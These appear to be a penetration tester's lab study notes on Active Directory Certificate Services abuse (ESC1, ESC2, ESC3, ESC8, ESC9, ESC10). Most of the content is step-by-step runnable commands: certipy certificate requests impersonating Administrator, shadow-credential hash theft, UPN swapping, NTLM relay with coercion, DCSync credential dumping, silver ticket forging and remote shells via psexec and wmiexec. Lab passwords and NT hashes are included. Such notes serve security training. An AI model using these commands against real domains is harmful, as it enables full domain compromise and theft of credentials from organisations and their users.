```
netexec ldap 10.129.205.199 -u "blwasp" -p "Password123!" -M adcs
```
%% use nxc to identify if there are any ADCS servers in the domain %%

```
certipy find -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -stdout
```
%% use certipy to enumerate ADCS service %%

## ESC1
The primary misconfiguration behind this domain escalation scenario lies in the possibility of specifying an alternate user in the certificate request. This means that if a certificate template allows including a subjectAltName (SAN) different from the user making the certificate request (CSR), it would allow us to request a certificate as any user in the domain. e.g if we compromise a domain account and it allowa inclusion of alternate names then we could request a certificate using desired alternate account.

## ESC1 Abuse Requirements

To abuse ESC1 the following conditions must be met:

1. The Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (social engineering tactics can bypass these security measures).
3. No authorized signatures are required.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template defines EKUs that enable authentication.
6. The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR.


```
certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
```
%% find vulnerabilities in ADCS %%

```
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -dc-host LAB-DC.lab.local -target LAB-DC.lab.local -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
```
%% certificate request with alternative SAN which creates a cert file name administrator.pfx which we can use later to authenticate as Administrator %%

```
certipy auth -pfx administrator.pfx -username administrator -dc-ip 10.129.228.236  -dc-host LAB-DC.lab.local -target LAB-DC.lab.local -upn
```
%% authenticate using administrator.pfx %%

```
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```
%%To use Kerberos and generate a TGT, we need to be able to make a domain name resolution. We can configure our DNS to point to the domain or put the domain name in the /etc/hosts file.%%

```
$  .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:administrator@lab.local
```
%% certificate request with alternative SAN (windows)%%

## ESC2
When a certificate template specifies the Any Purpose Extended Key Usage (EKU) or does not identify any Extended Key Usage, the certificate can be used for any purpose (client authentication, server authentication, code signing, etc.). If the template allows specifying a SAN in the CSR, a template vulnerable to ESC2 can be exploited similarly to ESC1.

## ESC2 Abuse Requirements

To abuse ESC2, the following conditions must be met:

1. The Enterprise CA must provide enrollment rights to low-privileged users.
2. Manager approval should be turned off.
3. No authorized signatures should be necessary.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template should define Any Purpose Extended Key Usage or have no Extended Key Usage specified.
```
Attack vector same as ESC1
```

## ESC3

The third abuse scenario, ESC3, is to abuse Misconfigured Enrollment Agent Templates, which bears similarities to ESC1 and ESC2. However, it involves exploiting a different Extended Key Usage (EKU) and necessitates an additional step to carry out the abuse.

To abuse this for privilege escalation, a CA requires at least two templates matching the conditions below:

Condition 1 - Involves a template that grants low-privileged users the ability to obtain an enrollment agent certificate. This condition is characterized by several specific details, which are consistent with those outlined in ESC1:

1. The Enterprise CA grants low-privileged users enrollment rights (same as ESC1).
2. Manager approval should be turned off (same as ESC1).
3. No authorized signatures are required (same as ESC1).
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates (same as ESC1).
5. The certificate template includes the Certificate Request Agent EKU, specifically the Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1), allowing the requesting of other certificate templates on behalf of other principals.
Condition 2 - Another template that permits low-privileged users to use the enrollment agent certificate to request certificates on behalf of other users. Additionally, this template defines an Extended Key Usage that allows for domain authentication. The conditions are as follows:

6. The Enterprise CA grants low-privileged users enrollment rights (same as ESC1).
7. Manager approval should be turned off (same as ESC1).
8. The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
9. The certificate template defines an EKU that enables domain authentication.
10. No restrictions on enrollment agents are implemented at the CA level.

```
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca 'lab-LAB-DC-CA' -template 'ESC3'
```
%% ESC3 cert request for blwasp or for the user who we intend to use to request a cert %%

```
certipy req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
```
%% request cert on behalf of administrator account%%

## ESC9
A key aspect to grasp is that if the msPKI-Enrollment-Flag attribute of a certificate template contains the CT_FLAG_NO_SECURITY_EXTENSION flag, it effectively negates the embedding of the szOID_NTDS_CA_SECURITY_EXT security extension. This means that irrespective of the configuration of the StrongCertificateBindingEnforcement registry key (even if set to its default value of 1), the mapping process will occur as if the registry key had a value of 0, essentially bypassing strong certificate mapping.

Consequently, this loophole can be exploited if we possess sufficient privileges to access and modify a user account's User Principal Name (UPN), aligning it with the UPN of another account. By leveraging this manipulated configuration, we can request a certificate for the user using their legitimate credentials. Remarkably, the obtained certificate will be seamlessly mapped to the other account, which is the ultimate target.

## ESC9 Abuse Requirements
To successfully abuse this misconfiguration, specific prerequisites must be met:

1. The StrongCertificateBindingEnforcement registry key should not be set to 2 (by default, it is set to 1), or the CertificateMappingMethods should contain the UPN flag (0x4). Regrettably, as a low-privileged user, accessing and reading the values of these registry keys is typically unattainable.

2. The certificate template must incorporate the CT_FLAG_NO_SECURITY_EXTENSION flag within the msPKI-Enrollment-Flag value.

3. The certificate template should explicitly specify client authentication as its purpose.

4. The attacker must possess at least the GenericWrite privilege against any user account (account A) to compromise the security of any other user account (account B).

```
certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
```
%% identify vulnerable templates %%

```
git clone https://github.com/ShutdownRepo/impacket -b dacledit
cd impacket
python3 -m venv .dacledit
source .dacledit/bin/activate
python3 -m pip install .
```
%% install dacledit which confirms if we have full control rights over the account whose certificate we want to request. This attack is only possible if we have full control rights over the account we are targeting%%

```
dacledit.py -action read -dc-ip 10.129.205.199 lab.local/blwasp:Password123! -principal blwasp -target user2
```
%% Using DACLEDIT to enumerate user rights%%

```
certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
```
%%Retrieve user2 NT Hash via Shadow Credentials %%

```
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user3@lab.local
```
%%Change user2(user we have full control over) UPN to user3(target user)%%

```
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9
```
%%Request vulnerable certipy with user2%%

```
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```
%%revert changes of user2 by changing user2 back to original UPN%%

```
certipy auth -pfx user3.pfx -domain lab.local
```
%%authenticate as user3 with the previous cert%%

## ESC10
Similar to ESC9 but focuses on misconfigurations in registry keys rather tan template configurations.

## ESC10 Abuse requirements - Case 1
To successfully abuse this misconfiguration, specific prerequisites must be met:

1. The StrongCertificateBindingEnforcement registry key is set to 0, indicating that no strong mapping is performed. It's important to note that this value will only be considered if the April 2023 updates have yet to be installed.
2. At least one template specifies that client authentication is enabled (e.g., the built-in User template).
3. We have at least GenericWrite rights for account A, allowing us to compromise account B.

```
reg.py 'lab'/'Administrator':'Password123!'@10.129.205.199 query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'
```
%% review registry keys as an administrator confirm that strongcertificatebindingenforcement is set to 0, you need an administrator on a DC %%

```
certipy shadow auto -u 'BlWasp@lab.local' -p 'Password123!' -account user2
```
%% retrieve user2 NT hash via shadow credentials %%

```
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn administrator@lab.local
```
%%change user2 UPN to Administrator%%

```
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User
```
%% request certificate using User template you should get administrator.pfx %%

```
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```
%% revert changes of user2 %%

```
certipy auth -pfx administrator.pfx -domain lab.local
```
%% authenticate as the administrator with the administrator.pfx %%

ESC10 Abuse Requirements - Case 2
To successfully carry out this privilege escalation tactic, specific prerequisites must be met:

The CertificateMappingMethods registry key is set to 0x4, indicating no strong mapping.
1. At least one template is enabled for client authentication (e.g., the built-in User template).
2. We have at least GenericWrite rights for any account A, allowing us to compromise any account B that does not already have a UPN set (e.g., machine accounts or built-in Administrator accounts). This is important to avoid constraint violation errors on the UPN.

```
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn 'lab-dc$@lab.local'
```
%% update account to match DC machine name %%

```
certipy req -u 'user2@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User
```
%% Request a certificate as user2 to get the domain controller certificate %%

```
certipy account update -u 'BlWasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```
%% revert changes of user 2 %%

```
certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell
```
%% create a new computer account and then use it to take over any other machine by configuring a Resource-Based Constrained Delegation. %%

```
certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip 10.129.205.199 -ldap-shell
```
%% Now, the computer account plaintext$ has the right to impersonate any account on LAB-DC$. We can use getST with the option impersonate to get a TGT as the Administrator %%

```
getST.py -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip 10.129.205.199 lab.local/'plaintext$':plaintext123
```
%% Abusing RBCD to Impersonate the Administrator %%

```
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```
%% connect using the Administrator TGT %%

## ESC8
NTLM relay is an attack where we intercept and then send authentication messages between devices on a network. To perform the NTLM relay attack against domain-joined machines, an adversary pretends to be a legitimate server for the client requesting authentication, in addition to pretending to be a legitimate client for the server that offers a service, relaying messages back and forth between them until establishing an authenticated session. After establishing an authenticated session with the server, the adversary abuses it to carry out authorized actions on behalf of the client; for the client, the adversary either sends an application message stating that authentication failed or terminates the connection:

To successfully exploit ESC8, we will coerce DC01 to authenticate against a machine we control and then relay its NTLM authentication to the ADCS server's HTTP web enrollment endpoints to generate a certificate that we can later use to authenticate as the coerced account/machine.

## ESC8 Conditions
- A vulnerable web enrollment endpoint.
- At least one certificate template enabled allows domain computer enrollment and client authentication (like the default Machine/Computer template).
```
sudo certipy relay -target 172.16.19.5 -template DomainController

```
%% the -target here represents the CA, we are coercing the domain controller to authenticate to us and then relaying that to the CA so that we can get a certificate which we can use later to authenticate to the domain controller%%

```
coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
```
%% use coercer to coerce our authentication against our target domain in this case the DC. -l represents our listening machine  and d reps the domain%%

```
certipy auth -pfx lab-dc.pfx
```
%% The next step will be to use this certificate to request a TGT and obtain the domain controller hash. With the DC TGT or hash, we can perform two operations. The first would be unique to a domain controller, and we can perform a DCSync attack, and the second would be to create a Silver Ticket. This one is useful when we are not attacking domain controllers, as we can compromise any machine in the network with this method %%

```
 KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local
```
%% DCSync using the TGT as the Domain Controller %%

```
secretsdump.py 'lab-dc$'@lab-dc.lab.local -hashes :92bd84175886a57ab41a14731d10428a
```
%%  DCSync using the NT Hash as the Domain Controller %%

```
lookupsid.py 'lab-dc$'@172.16.19.3 -hashes :92bd84175886a57ab41a14731d10428a
```
%% you can do a silver ticket attack. You need the target's machine (i.e., LAB-DC$) hash, which in this case, is 92bd84175886a57ab41a14731d10428a, the Domain SID, and a specific SPN to abuse %%

```
ticketer.py -nthash 92bd84175886a57ab41a14731d10428a -domain-sid S-1-5-21-1817219280-1014233819-995920665 -domain lab.local -spn cifs/lab-dc.lab.local Administrator
```
%% forging a silver ticket attack with all the specified parameters %%

```
KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass lab-dc.lab.local
```
%% pass the ticket attack with PsExec %%